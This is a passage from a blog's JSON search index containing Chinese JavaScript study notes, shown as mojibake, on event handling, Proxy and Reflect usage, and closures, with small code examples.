thisçš„æŒ‡å‘é—®é¢˜    äº‹ä»¶å¤„ç†ç¨‹åºçš„ä½œç”¨åŸŸå–å†³äºæŒ‡å®šçš„æ–¹å¼ï¼Œæ‰€ä»¥thiså€¼å¹¶ä¸æ€»æ˜¯ç­‰äºäº‹ä»¶ç›®æ ‡ã€‚åœ¨IEäº‹ä»¶å¯¹è±¡ä¸­å­˜åœ¨ä¸€ä¸ªå±æ€§srcElementï¼Œåªè¯»ï¼ŒæŒ‡å‘äº‹ä»¶ç›®æ ‡ï¼ˆåŒDOMä¸­çš„targetï¼‰å¯ä»¥ä»£æ›¿thisã€‚        é˜»æ­¢é»˜è®¤åŠ¨ä½œ  â€‹\treturnValue = false ç­‰åŒäº DOMä¸­çš„preventDefault()ï¼Œå–æ¶ˆäº‹ä»¶é»˜è®¤è¡Œä¸ºã€‚â€‹\t`\tcancelButton = true` å±æ€§é˜»æ­¢äº‹ä»¶å†’æ³¡ï¼ˆIE ä¸­åªæœ‰å†’æ³¡ï¼‰ã€‚â€‹\tstopPropagation() ç”¨ä»¥ç«‹å³é˜»æ­¢äº‹ä»¶æµåœ¨DOMç»“æ„çš„ä¼ æ’­ï¼Œå–æ¶ˆåç»­äº‹ä»¶çš„æ•è·å’Œå†’æ³¡ã€‚è·¨æµè§ˆå™¨äº‹ä»¶å¯¹è±¡var EventUtil = {    // addHandler()     getEvent: function(event){        return event? event : window.event;    },    getTarget: function(event){        return event.target || event.srcElement;    },    preventDefault: function(event){        if(event.preventDefault) event.preventDefault();        else\tevent.returnValue = false;    },    // removeHandler()}å†…å­˜å’Œæ€§èƒ½â€‹\tåœ¨JavaScriptä¸­ï¼Œé¡µé¢çš„å¤„ç†ç¨‹åºæ•°é‡ä¸é¡µé¢æ•´ä½“æ€§èƒ½ç›¸å…³ã€‚â€‹\t:one: æ¯ä¸ªå¤„ç†ç¨‹åºéƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½å ç”¨å†…å­˜ç©ºé—´ï¼›â€‹\t:two: å¤„ç†ç¨‹åºéœ€è¦è®¿é—®DOMæ¬¡æ•°é€ æˆé¡µé¢äº¤äº’å»¶é•¿ï¼›â€‹\t:three: ä¸æ­£å½“æ¸…ç†å¤„ç†ç¨‹åºï¼Œä¼šå¯¼è‡´DOMå…ƒç´ è¢«å¼•ç”¨æ¬¡æ•°è¿‡å¤šè€Œæ— æ³•é‡Šæ”¾å†…å­˜ã€‚äº‹ä»¶å§”æ‰˜â€‹\tç»™æ‰€æœ‰å…ƒç´ çš„ å…±åŒçˆ¶èŠ‚ç‚¹æ·»åŠ ä¸€ä¸ªäº‹ä»¶å¤„ç†ç¨‹åºï¼Œåˆ©ç”¨å†’æ³¡å‘ä¸Šä¼ é€’çš„æ€§è´¨ï¼Œæ ¹æ®ä¼ å…¥çš„äº‹ä»¶ç±»å‹å†³å®šæ‰§è¡Œçš„å¤„ç†ç¨‹åºã€‚â€‹\tğŸ‘éšæ—¶å¯ç”¨ã€‚åªæœ‰é¡µé¢æ¸²æŸ“å‡ºå¯ä»¥äº¤äº’çš„å…ƒç´ ï¼Œå¯ä»¥æ— å»¶è¿Ÿèµ·ä½œç”¨ï¼ˆæ— éœ€è¦ç­‰å¾…DOMContentLoadedå’Œloadäº‹ä»¶ï¼‰â€‹\tğŸ‘èŠ‚çœå¼•ç”¨ã€ä»£ç æ•°é‡ã€‚å‡å°‘æ•´ä¸ªé¡µé¢éœ€è¦çš„å†…å­˜ï¼Œæä¾›æ€§èƒ½ã€‚åˆ é™¤äº‹ä»¶å¤„ç†ç¨‹åºâ€‹\tç›´æ¥åˆ é™¤å¸¦æœ‰äº‹ä»¶å¤„ç†ç¨‹åºçš„å…ƒç´ ï¼Œå› ä¸ºå­˜åœ¨ç€å…ƒç´ çš„å¼•ç”¨å’Œç¨‹åºçš„å¼•ç”¨ï¼Œæ‰€ä»¥ä¸ä¼šè¢«åƒåœ¾æ”¶é›†ç¨‹åºæ­£å¸¸æ¸…ç†ã€‚// æ­£ç¡®å¤„ç†ï¼šlet btn = document.getElementById('myBtn');btn.onclick = funciton(){    //    btn.onclick = null; // åˆ é™¤äº‹ä»¶å¤„ç†ç¨‹åº    document.getElementById('myDiv').innerHTML = 'çˆ¶èŠ‚ç‚¹æ›¿æ¢æ‰æŒ‰é’®çš„å†…å®¹'}â€‹\té¡µé¢å¸è½½åï¼Œäº‹ä»¶å¤„ç†ç¨‹åºæ²¡æœ‰è¢«æ¸…ç†ï¼Œåˆ™ä»ç„¶ä¼šé©»ç•™åœ¨å†…å­˜ä¸­ï¼›éšç€é¡µé¢æ¯æ¬¡åŠ è½½ã€å¸è½½ï¼Œè¶Šæ¥è¶Šå ç”¨å†…å­˜ã€‚åº”è¯¥åœ¨ onunload ä¹‹å‰ï¼Œåˆ é™¤äº‹ä»¶å¤„ç†ç¨‹åºï¼›åœ¨onload äº‹ä»¶å¤„ç†ç¨‹åºä¸­åšäº†ä»€ä¹ˆï¼Œå°±åº”è¯¥åœ¨ onunloadäº‹ä»¶å¤„ç†ç¨‹åºä¸­æ¢å¤ã€‚"
  },
  
  {
    "title": "9. Proxy & Reflect",
    "url": "/posts/9.Proxy&Reflect/",
    "categories": "JavaScript, Object",
    "tags": "javascriptBase",
    "date": "2022-09-01 00:00:00 +0800",
    





    
    "snippet": "Proxy &amp; Reflect  ä»£ç† â€” æ”¹å˜æŸäº›æ“ä½œçš„é»˜è®¤è¡Œä¸ºï¼Œ â€” Reflectç¡®ä¿åŸæœ‰é»˜è®¤è¡Œä¸ºæ­£å¸¸                              [å®ç°å…ƒç¼–ç¨‹]([Reflect Metadata          æ·±å…¥ç†è§£ TypeScript (jkchao.github.io)](https://jkchao.github.io/typescript-bo...",
    "content": "Proxy &amp; Reflect  ä»£ç† â€” æ”¹å˜æŸäº›æ“ä½œçš„é»˜è®¤è¡Œä¸ºï¼Œ â€” Reflectç¡®ä¿åŸæœ‰é»˜è®¤è¡Œä¸ºæ­£å¸¸                              [å®ç°å…ƒç¼–ç¨‹]([Reflect Metadata          æ·±å…¥ç†è§£ TypeScript (jkchao.github.io)](https://jkchao.github.io/typescript-book-chinese/tips/metadata.html#åŸºç¡€)) â€” å¯¹ç¼–ç¨‹è¯­è¨€è¿›è¡Œç¼–è¯‘ï¼ˆåœ¨è¯­è¨€å±‚é¢ç¼–ç¨‹ï¼‰                      var proxy = new Proxy( target, handler )          target â€” æ‰€è¦æ‹¦æˆªçš„ ç›®çš„å¯¹è±¡      handle â€” å®šåˆ¶æ‹¦æˆªå¯¹è±¡        Proxy.prototype = undefined ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨instanceofæ“ä½œç¬¦  ä¸å¯é…ç½®ã€ä¸å¯è¯»å†™çš„å±æ€§ä¸èƒ½ä»£ç†var proxy = new Proxy({},{    get:function(target, key, receiver){ // obj.pæ—¶ï¼Œè§¦å‘pä½œä¸ºtarget        return Reflect.get(target, propKey, receiver);    },    set:function(target, key, value, receiver){        return Reflect.set(target, propKey, value, receiver);    }})let obj = Object.creat(proxy); // å°†proxyæ·»åŠ åˆ°objçš„åŸå‹ä¸Šï¼Œå®ç°Proxyçš„ç»§æ‰¿ï¼Œè¯»å–ã€åŸå‹å±æ€§ã€‘ä¼šè¢«æ‹¦æˆªvar object = {proxy: new Proxy(target, handler)}; // object å¯ä»¥è°ƒç”¨proxyè¦ä½¿Proxyèµ·ä½œç”¨ï¼Œå¿…é¡»é’ˆå¯¹Proxyå®ä¾‹proxyæ“ä½œï¼Œè€Œä¸æ˜¯é’ˆå¯¹ç›®æ ‡å¯¹è±¡æ“ä½œ â€”â€” ç›´æ¥æ“ä½œä¼šç»•è¿‡ä»£ç†æ–½äºˆçš„è¡Œä¸ºconst targetObj = {    where:function(){        console.log(\"I am in target\");    }};var proxy = new Proxy(targetObj,{    get:function(target, propKey){        if(propKey === \"where\"){ // targetObj é‡Œé¢çš„å±æ€§å === whereè¿›è¡Œæ‹¦æˆª            console.log(\"I am in proxy\");        }        return target[propKey]; // è¿”å›targetObjåŸæœ‰çš„å±æ€§    }});proxy.where();  //I am in proxy + I am in targettarget.where(); //I am in targetè‹¥handleræ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œåˆ™æ²¡æœ‰ä»»ä½•æ‹¦æˆªæ•ˆæœï¼Œè®¿é—® Proxy = è®¿é—® targetReflectâ€‹\tReflectä¸€ä¸ªå…¨å±€å†…ç½®å¯¹è±¡ï¼Œå°†é»˜è®¤æ“ä½œä»å¤„ç†å™¨è½¬å‘åˆ° targetã€‚å¤„ç†å™¨å¯¹è±¡ä¸­æ‰€æœ‰å¯ä»¥æ•è·çš„æ–¹æ³•éƒ½æœ‰å¯¹åº”çš„åå°„ï¼ˆReflectï¼‰APIæ–¹æ³•ã€‚Reflect ä¸ targe æ–¹æ³•å…·æœ‰ç›¸åŒçš„åç§°å’Œç­¾åå±æ€§ï¼Œä¸”å…·æœ‰ç›¸åŒçš„æ–¹æ³•è¡Œä¸ºã€‚â€‹\tReflectä¸æ˜¯ä¸€ä¸ªå‡½æ•°å¯¹è±¡ã€æ„é€ å‡½æ•°ï¼Œæ— æ³•åƒå¯¹è±¡ä¸€æ ·è°ƒç”¨å’Œä½¿ç”¨newåˆ›å»ºå®ä¾‹ï¼›å†…éƒ¨æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•éƒ½æ˜¯é™æ€ã€‚// 1. å®‰å…¨è°ƒç”¨å‡½æ•°// ä½¿ç”¨ apply è°ƒç”¨å‡½æ•°æ—¶ï¼Œtarget å¯èƒ½è‡ªå®šä¹‰äº†è‡ªå·±çš„ apply å±æ€§ï¼Œå¯ä»¥ä½¿ç”¨ Function.prototype è§„é¿è¿™ä¸ªé—®é¢˜Function.prototype.apply.call(Math.floor, undefined, [1.75]); // 1Reflect.apply(Math.floor, undefined, [1.75]); // 1;â€‹\tæ ¹æ®ä¸€äº›åå°„æ–¹æ³•è¿”å›â€çŠ¶æ€æ ‡è®°â€çš„å¸ƒå°”å€¼ï¼Œå¯ä»¥æ£€æŸ¥æ„å›¾æ“ä½œæ˜¯å¦æˆåŠŸã€‚ä½†å¦‚æœæ˜¯è¯­æ³•å‡ºç°é—®é¢˜ï¼Œæ— æ³•æ‹¦æˆªé”™è¯¯ã€‚// 2. ä½¿ç”¨â€œçŠ¶æ€æ ‡å¿—â€æ›¿æ¢å±æ€§å®šä¹‰å¼‚å¸¸æ•è·å¤„ç†try{    Object.defineProperty(obj, prop, attr);}catch(e) {    // Fail}\t// // if (Reflect.defineProperty(obj, prop, attr)) if (Reflect.defineProperty(o,'foo',{value:'bar'})){    console.log(\"1\")}else{    console.log(\"2\")}            Reflect API      è¿”å›å€¼      ä¸æ“ä½œç¬¦ç›¸æ¯”                  Reflect.defineProperty()      æä¾›çŠ¶æ€æ ‡å¿—      Â               Reflect.deleteProperty()      æä¾›çŠ¶æ€æ ‡å¿—      ä»£æ›¿deleteæ“ä½œç¬¦              Reflect.setPrototyoeOf()      æä¾›çŠ¶æ€æ ‡å¿—      Â               Reflect.has()      Â       ä»£æ›¿inã€withæ“ä½œç¬¦              Reflect.set()      æä¾›çŠ¶æ€æ ‡å¿—      ä»£æ›¿=æ“ä½œç¬¦              Reflect.get()      Â       ä»£æ›¿å¯¹è±¡å±æ€§è®¿é—®æ“ä½œç¬¦              Reflect.preventExtensions()      æä¾›çŠ¶æ€æ ‡å¿—      ç±»ä¼¼Objext.preventExtensionsï¼ˆå¯å¼ºè½¬ä¸ºå¯¹è±¡ï¼‰ï¼Œä½†æ“ä½œå¯¹è±¡åªèƒ½æ˜¯å¯¹è±¡              Reflect.construct()      Â       ä»£æ›¿newæ“ä½œç¬¦      // 3.Reflect API ä¸ ä¸€ç­‰å‡½æ•° æ›¿æ¢ä½¿ç”¨Reflect.has(Object, \"assign\"); // true\"assign\" in Object // trueâ€‹\tåœ¨ä»£ç†ä¸­ç®€åŒ–ä½¿ç”¨Reflectconst handler = {    get() {        const someString = \"ä¿®é¥°è¿”å›å€¼\"        return Reflect.get(...arg) + someString;    }}new Proxy(target, handler)const handler = {    get:Reflect.get;}new Proxy(target, handler)// æ•è·æ‰€æœ‰æ–¹æ³•ï¼Œå¹¶è½¬å‘ç»™å¯¹åº”åå°„APIçš„ç©ºä»£ç†ï¼Œå¯ä»¥ä¸å®šä¹‰Handlerï¼Œç›´æ¥ä½¿ç”¨Reflectnew Proxy(target, Reflect)thisçš„é—®é¢˜  ç›®æ ‡å¯¹è±¡å†…éƒ¨çš„thisï¼ŒæŒ‡å‘Proxyä»£ç†          Proxyæ— æ³•ä»£ç†ç›®æ ‡å¯¹è±¡      é€šè¿‡thisåŒºåˆ†çš„å†…éƒ¨å‡½æ•°ï¼ŒæŒ‡å‘proxyåå¯èƒ½å–ä¸åˆ°      ã€ä½¿ç”¨ç›®æ ‡å¯¹è±¡è°ƒç”¨è‡ªèº«å±æ€§æ–¹æ³•ã€‘Reflect.get()        æ‹¦æˆªå‡½æ•°çš„thisï¼ŒæŒ‡å‘handlerå¯¹è±¡getget(target, propKey, receiver)  propKey â€” å±æ€§å  receiver â€” æ“ä½œè¡Œä¸ºæ‰€é’ˆå¯¹çš„å¯¹è±¡ [å¯é€‰] ï¼ˆï¼‰  ç›®æ ‡å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§ï¼Œè®¿é—®æ—¶æŠ›å‡ºæŒ‡å®šçš„é”™è¯¯  æ•°ç»„è¯»å–è´Ÿæ•°çš„ç´¢å¼•  è¯»å–å±æ€§è¿”å›å‡½æ•°ï¼Œå®ç°é“¾å¼æ“ä½œ  ç”Ÿæˆå„ç§DOMèŠ‚ç‚¹çš„é€šç”¨å‡½æ•° ç›®æ ‡å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§ï¼Œè®¿é—®æ—¶æŠ›å‡ºæŒ‡å®šçš„é”™è¯¯// ç›®æ ‡å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§ï¼Œè®¿é—®æ—¶æŠ›å‡ºæŒ‡å®šçš„é”™è¯¯var person = {    name: 'å¼ ä¸‰'}var proxy = new Proxy(person, {    get: function (target, propKey) {        if (propKey in target) {            return target[propKey]        } else {            throw new ReferenceError(`å±æ€§å${propKey}ä¸å­˜åœ¨`)        }    }})proxy.nameproxy.ageæ•°ç»„è¯»å–è´Ÿæ•°çš„ç´¢å¼•// æ•°ç»„è¯»å–è´Ÿæ•°çš„ç´¢å¼•function createArray(...elements){    let handle = {        get(target, propKey, recevier){            let index = Number(propKey);            if(index &lt; 0) propKey = String(target.length + index); // å€’åº            return Reflect.get(target, propKey, recevier) // ç»“æŸä»£ç†å¤„ç†ï¼Œä½¿ç”¨targetåŸç”Ÿå¤„ç†å‡½æ•°        }    }    let target = [];    target.push(...elements);    return new Proxy(target, handle)}let arr = createArray('a','b','c','d','f');console.log(arr[-1]); // fè¯»å–å±æ€§è¿”å›å‡½æ•°ï¼Œå®ç°é“¾å¼æ“ä½œvar pipe = function(value){var funcStacke = []; // å‡½æ•°å †var oproxy = new Proxy({},{    get: function(pipObject, fnName){        /* å¦‚æœå½“å‰å‡½æ•°ä¸ºgetï¼Œåˆ™é“¾å¼ä¼ é€’åˆ°æœ€åä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›å †æ ˆå†…å‡½æ•°çš„è®¡ç®—ç»“æœ           å¦è€…ï¼Œä¸ä¸ºgetï¼Œé“¾å¼ä¼ é€’åé¢è¿˜æœ‰å‡½æ•°ï¼Œå°†å½“å‰å‡½æ•°æ¨å…¥funcStrckeï¼Œè¿”å›Proxyï¼Œç»§ç»­æ¨å…¥å‡½æ•° */        if(fnName === 'get') {            /* reduce ä¸­çš„æ¯ä¸€é¡¹éƒ½é€’å½’ä¼ å…¥ï¼Œ            æŒ‡å®švalï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰ä¸ºpipeçš„å‚æ•°ï¼›fnæ˜¯funcStackeçš„ç¬¬äºŒä¸ªå‡½æ•°ï¼Œ            è¿”å›è®¡ç®—çš„ç»“æœå€¼ */            return funcStacke.reduce(function(val, fn){                return fn(val)            },value)}        funcStacke.push(window[fnName]); //        return oproxy;    \t}\t});    return oproxy;}var double = n =&gt; n*2;let number = pipe(2).double.get;// 1.pipObject = {}; fnName = double,  funcStacke = ['n =&gt; n*2']// 2.pipObject = {}; fnName = get;      console.log(number);ç”Ÿæˆå„ç§DOMèŠ‚ç‚¹çš„é€šç”¨å‡½æ•°// 1. target:obj -- property:p -- attrs:href: '//example.com' -- children: ['Mark']// 2. target:obj -- property:a -- attrs:{} -- children:['The web']// 3. target:obj -- property:ul - attrs:{} -- children:['Food']// 4. target:obj -- property:li - attrs:{} -- children:[\"â€¦actually that's it\"] // 5. target:obj -- property:li - attrs:{} -- children:[li, li, li]    // 6. target:obj -- property:li - attrs:{} -- children:['Hello, my name is ', a, '. I like:', ul] const dom = new Proxy({}, {    get(target, property) {        return function (attrs = {}, ...children) {            const el = document.createElement(property); // ä¼ å…¥çš„å±æ€§å€¼åˆ›å»ºèŠ‚ç‚¹            for (let prop of Object.keys(attrs)) {                el.setAttribute(prop, attrs[prop]); // èŠ‚ç‚¹æ·»åŠ å±æ€§            }            for (let child of children) {                 if (typeof child === 'string') { // å­©å­èŠ‚ç‚¹æ˜¯å­—ç¬¦ä¸²ï¼Œæ·»åŠ èŠ‚ç‚¹æ–‡å­—                    child = document.createTextNode(child);                }                el.appendChild(child); // çˆ¶èŠ‚ç‚¹æ·»åŠ å­©å­            }            return el;        }    }});const el = dom.p({},                 'Hello, my name is ',                 dom.a({ href: '//example.com' }, 'Mark'),                 '. I like:',                 dom.ul({},                        dom.li({}, 'The web'),                        dom.li({}, 'Food'),                        dom.li({}, 'â€¦actually that\\'s it')                       )                );document.body.appendChild(el);setâ€‹\tset(target, propKey, propValue, receiver)  propKey â€” å±æ€§å  propValue â€” å±æ€§å€¼  æ•°æ®éªŒè¯ â€” ä¸ç¬¦åˆè¦æ±‚çš„è®¾å®šå€¼ï¼ŒæŠ›å‡ºå¼‚å¸¸  æ•°æ®ç»‘å®š â€” å½“å¯¹è±¡å‘é€å˜åŒ–æ˜¯ï¼Œè‡ªåŠ¨æ›´æ–°DOM  ç»“åˆsetã€getï¼Œå®ç°å±æ€§åç¬¬ä¸€ä¸ªå­—ç¬¦ä½¿ç”¨ä¸‹åˆ’çº¿ï¼Œä¸å…è®¸å¤–éƒ¨ä½¿ç”¨æ•°æ®éªŒè¯ â€” ä¸ç¬¦åˆè¦æ±‚çš„è®¾å®šå€¼ï¼ŒæŠ›å‡ºå¼‚å¸¸let validator = {    set: function (obj, prop, value) {        if (prop === 'age') {            if (!Number.isInteger(value)) {                throw new TypeError('The age is not an integer');            }            if (value &gt; 200) {                throw new RangeError('The age seems invalid');            }        }        // å¯¹äºæ»¡è¶³æ¡ä»¶çš„ age å±æ€§ä»¥åŠå…¶ä»–å±æ€§ï¼Œç›´æ¥ä¿å­˜        obj[prop] = value;        return true;    }};let person = new Proxy({}, validator);person.age = 100;person.age = 'young' // æŠ¥é”™person.age = 300 // æŠ¥é”™æ•°æ®ç»‘å®š â€” å½“å¯¹è±¡å‘é€å˜åŒ–æ˜¯ï¼Œè‡ªåŠ¨æ›´æ–°DOM&lt;body&gt;    &lt;input type=\"text\" id=\"model\"&gt;    &lt;p id=\"words\"&gt;222&lt;/p&gt;&lt;/body&gt;const model = document.getElementById(\"model\");const words = document.getElementById(\"words\");const proxy = new Proxy({}, {    get(target, propKey, receiver) {        return Reflect.get(target, propKey, receiver)    },    set(target, propKey, propValue, receiver) {        if (propKey === 'key') { // ä¿®æ”¹çš„å±æ€§åæ˜¯keyï¼Œåˆ™ä¿®æ”¹å¯¹åº”çš„å€¼            model.value = propValue;            words.innerHTML = propValue        }        return Reflect.set(target, propKey, propValue, receiver)    }})// ç»™è¾“å…¥æ¡†æ·»åŠ ç‚¹å‡»äº‹ä»¶model.addEventListener('keyup', (e) =&gt; {    proxy.key = e.target.value;})ç»“åˆsetã€getï¼Œå®ç°å±æ€§åç¬¬ä¸€ä¸ªå­—ç¬¦ä½¿ç”¨ä¸‹åˆ’çº¿ï¼Œä¸å…è®¸å¤–éƒ¨ä½¿ç”¨const handler = {    get(target, key) {        invariant(key, 'get');        return target[key];    },    set(target, key, value) {        invariant(key, 'set');        target[key] = value;        return true;    }};function invariant(key, action) {    if (key[0] === '_') {        throw new Error(`Invalid attempt to ${action} private \"${key}\" property`);    }}const target = {};const proxy = new Proxy(target, handler);proxy._prop// Error: Invalid attempt to get private \"_prop\" propertyproxy._prop = 'c'  // Error: Invalid attempt to set private \"_prop\" propertyapply(target, this, args)â€‹\tapply(target, this, args){}      thisï¼Œç›®æ ‡å¯¹è±¡çš„ä¸Šä¸‹æ–‡        argsï¼Œç›®æ ‡å¯¹è±¡å‚æ•°æ•°ç»„    æ‹¦æˆªå‡½æ•° â€” callã€apply â€” è§¦å‘è°ƒç”¨  has (targetï¼Œ key)  key ï¼Œéœ€è¦æŸ¥è¯¢çš„å±æ€§å  æ‹¦æˆª HasProperty()          has() ä¸åˆ¤æ–­ä¸€ä¸ªå±æ€§æ˜¯å¯¹è±¡è‡ªèº«çš„ï¼Œè¿˜æ˜¯ç»§æ‰¿çš„      åªå¯¹ inè¿ç®—ç¬¦ç”Ÿæ•ˆï¼Œè€Œä¸å¯¹for... inç”Ÿæ•ˆ      construct (target, args, newTarget)  newTargetï¼Œ åˆ›å»ºå®ä¾‹å¯¹è±¡ï¼Œnewå‘½ä»¤ä½œç”¨çš„æ„é€ å‡½æ•°  :warning: targetå¿…é¡»æ˜¯å‡½æ•°  :warning: è¿”å›çš„å¿…é¡»æ˜¯å¯¹è±¡å­˜åœ¨é—®é¢˜ç›®æ ‡å¯¹è±¡æ–¹æ³•ä¾èµ–äºè°ƒç”¨å¯¹è±¡æ ‡è¯†const wm = new WeakMap() // ç±»å¤–éƒ¨å®šä¹‰ï¼Œæ‰€æœ‰å®ä¾‹å…±äº«ä¸€ä¸ª WeakMapclass User{    constructor(id){        wm.set(this,id)    }    get id(id) return wm.get(this);    set id(newid) \twm.set(this,id)    // ... get() set()}const user = new User(123);const userProxy = new Proxy(user,{}); // wm: {user {}: 123}wm.get(User)\t// undefineduser.id \t\t// ç›¸å½“äº wm.get(user), è¿”å› 123userProxy.id \t// ç›¸å½“äº wm.get(userProxy), è¿”å› undefinedâ€‹\twm.get(this) æ–¹æ³•ä¾èµ–äºè°ƒç”¨çš„å¯¹è±¡ï¼Œæš´éœ²äº†thisæŒ‡å‘é—®é¢˜ï¼Œä½¿å¾—è¿”å›å€¼ä¸æ­£ç¡®ï¼›æŠŠä»£ç†Userå®ä¾‹æ”¹ä¸ºä»£ç†Userç±»æœ¬èº«ï¼Œå†åˆ›å»ºä»£ç†å®ä¾‹ï¼Œå°±ä¼šä»¥ä»£ç†å®ä¾‹ä½œä¸ºWeakMapçš„é”®äº†ã€‚const UserClassProxy = new Proxy(User,{});const proxyUser = new UserClassProxy(456);const proxyUser2 = new UserClassProxy(789)// wm: WeakMapÂ {User =&gt; 456, User =&gt; 789}wm.get(User) // undefineduser \t// undefined ç±»æ²¡æœ‰åˆ›å»ºå®ä¾‹ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨ç±»ä»£ç†ï¼Œåˆ›å»ºä»£ç†çš„å®ä¾‹proxyUser.id // 456proxyUser2.id // 789ä»£ç†ä¸å†…éƒ¨æ§½ä½â€‹\tå½“ECMAScriptå†…ç½®ç±»å‹å¯èƒ½ä¼šä¾èµ–æŸäº›ä»£ç†æ— æ³•æ§åˆ¶ï¼ˆè®¿é—®å™¨æ— æ³•è®¿é—®åˆ°çš„æ–¹æ³•ï¼‰çš„æœºåˆ¶ï¼Œä¼šå¯¼è‡´ä½¿ç”¨ä»£ç†è°ƒç”¨æ—¶å‡ºç°é—®é¢˜ã€‚â€‹\tä¾‹å¦‚Date ç±»å‹æ–¹æ³•çš„æŒ‡å‘ä¾èµ–thiså€¼ä¸Šçš„å†…éƒ¨æ§½ä½[[NumberDate]]ï¼Œå€¼ä¸èƒ½é€šè¿‡æ™®é€šçš„get()å’Œset()æ“ä½œè®¿é—®åˆ°ï¼Œä¸”ä»£ç†å¯¹è±¡ä¸å­˜åœ¨è¿™ä¸ªå†…éƒ¨æ§½ä½ã€‚äºæ˜¯ä»£ç†æ‹¦æˆªåæœ¬åº”è¯¥è½¬å‘ç»™ç›®æ ‡å¯¹è±¡çš„æ–¹æ³•ï¼Œä¼šæŠ›å‡ºå¼‚å¸¸ TyperErrorã€‚const target = new Date();const proxy = new Proxy(target, {});proxy instanceof Date; // trueproxy.getDate(); // 'this' is not a Date object;"
  },
  
  {
    "title": "8. é—­åŒ…",
    "url": "/posts/8.%E9%97%AD%E5%8C%85/",
    "categories": "JavaScript, é—­åŒ…",
    "tags": "javascriptBase",
    "date": "2022-08-29 00:00:00 +0800",
    





    
    "snippet": "é—­åŒ…ä½œç”¨åŸŸ  åœ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ï¼Œå­˜åœ¨ä¸¤ç§å˜é‡ï¼š  å˜é‡å¯¹è±¡ï¼ˆå…¨å±€å˜é‡ï¼‰ï¼šå…¨å±€ä¸Šä¸‹æ–‡ï¼Œåœ¨ä»£ç æ‰§è¡ŒæœŸé—´å§‹ç»ˆå­˜åœ¨ï¼Œä¿å­˜åœ¨scope-scripté‡Œ  æ´»åŠ¨å¯¹è±¡ï¼ˆå±€éƒ¨å˜é‡ï¼‰ï¼šæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œåªåœ¨å‡½æ•°æ‰§è¡ŒæœŸé—´å­˜åœ¨  ç”Ÿæˆçš„æ—¶æœºï¼š  åœ¨å®šä¹‰å‡½æ•°æ—¶ï¼Œä¼šä¸ºå®ƒåˆ›å»ºä½œç”¨åŸŸé“¾ï¼Œç”³è¯·ç©ºé—´ï¼Œé¢„è£…è½½å…¨å±€å˜é‡ï¼Œå¹¶ä¿å­˜åœ¨å†…éƒ¨çš„[[scope]]ä¸­ã€‚  é¢„ç¼–è¯‘ä¸ä¼šæ‰§è¡Œå‡½æ•°é‡Œé¢çš„å†…å®¹  åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œåˆ›å»ºç›¸åº”çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¹¶é€šè¿‡å¤åˆ¶...",
    "content": "é—­åŒ…ä½œç”¨åŸŸ  åœ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­ï¼Œå­˜åœ¨ä¸¤ç§å˜é‡ï¼š  å˜é‡å¯¹è±¡ï¼ˆå…¨å±€å˜é‡ï¼‰ï¼šå…¨å±€ä¸Šä¸‹æ–‡ï¼Œåœ¨ä»£ç æ‰§è¡ŒæœŸé—´å§‹ç»ˆå­˜åœ¨ï¼Œä¿å­˜åœ¨scope-scripté‡Œ  æ´»åŠ¨å¯¹è±¡ï¼ˆå±€éƒ¨å˜é‡ï¼‰ï¼šæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œåªåœ¨å‡½æ•°æ‰§è¡ŒæœŸé—´å­˜åœ¨  ç”Ÿæˆçš„æ—¶æœºï¼š  åœ¨å®šä¹‰å‡½æ•°æ—¶ï¼Œä¼šä¸ºå®ƒåˆ›å»ºä½œç”¨åŸŸé“¾ï¼Œç”³è¯·ç©ºé—´ï¼Œé¢„è£…è½½å…¨å±€å˜é‡ï¼Œå¹¶ä¿å­˜åœ¨å†…éƒ¨çš„[[scope]]ä¸­ã€‚  é¢„ç¼–è¯‘ä¸ä¼šæ‰§è¡Œå‡½æ•°é‡Œé¢çš„å†…å®¹  åœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œåˆ›å»ºç›¸åº”çš„æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå¹¶é€šè¿‡å¤åˆ¶å‡½æ•°çš„[[scope]]åˆ›å»ºå…¶ä½œç”¨åŸŸé“¾ï¼›å¹¶åˆ›å»ºå‡½æ•°çš„æ´»åŠ¨å¯¹è±¡ï¼Œæ¨å…¥ä½œç”¨åŸŸé“¾çš„å‰ç«¯ã€‚â€‹\tä½œç”¨åŸŸé“¾ï¼šåŒ…å«æŒ‡é’ˆçš„åˆ—è¡¨ï¼Œæ‰§è¡Œæ¯ä¸€ä¸ªå˜é‡å¯¹è±¡ï¼›æ ‡è¯†æ‰€åœ¨ä½ç½®è¶Šæ·±ï¼Œè¯»å†™é€Ÿåº¦å°±ä¼šè¶Šæ…¢ï¼ˆå…¨å±€æ€»æ˜¯åœ¨æœ€æœ«ç«¯ï¼‰â€‹\tåœ¨ä¸€ä¸ªå‡½æ•°å†…éƒ¨å®šä¹‰çš„å‡½æ•°ï¼Œä¼šæŠŠå…¶åŒ…å«å‡½æ•°çš„æ´»åŠ¨å¯¹è±¡ï¼ˆæ‰€æœ‰å¤–éƒ¨çš„å±€éƒ¨å˜é‡ï¼‰æ·»åŠ åˆ°è‡ªå·±ä½œç”¨åŸŸé“¾ä¸­â€‹\tå¤šæ¬¡è°ƒç”¨åŒä¸€ä¸ªå‡½æ•°ï¼Œå ç”¨ä¸åŒçš„ç©ºé—´ï¼Œå¤šä¸ªå†…å­˜åœ°å€ï¼Œä¹‹é—´çš„æ•°æ®ä¸ä¼šå…±äº«å‡½æ•°ç”Ÿå‘½å‘¨æœŸå»¶é•¿      æ™®é€šå‡½æ•°åˆ›å»ºå®ä¾‹    return å†…éƒ¨å‡½æ•°ï¼ˆå¼•ç”¨ç±»å‹ï¼‰ç»™å¤–éƒ¨ä½¿ç”¨let a = 